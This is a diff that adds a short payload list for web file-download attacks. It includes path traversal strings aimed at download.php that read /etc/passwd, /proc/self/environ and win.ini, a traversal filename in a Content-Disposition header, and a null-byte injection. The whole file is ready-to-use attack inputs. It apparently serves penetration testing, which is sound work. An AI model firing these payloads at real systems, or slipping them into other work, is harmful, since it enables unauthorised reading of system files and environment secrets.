@@ -1,0 +1,12 @@
+// Arbitrary File Download (LFD)
+download.php?file=../index.php
+download.php?file=/etc/passwd
+download.php?file=C:/Windows/win.ini
+download.php?file=file:///proc/self/environ
+download.php?file=../../../../../../../../../../../../../../../../etc/passwd
+
+// Path Traversal via Header
+Content-Disposition: attachment; filename="../../etc/passwd"
+
+// Null Byte Injection
+download.php?file=index.php%00.txt
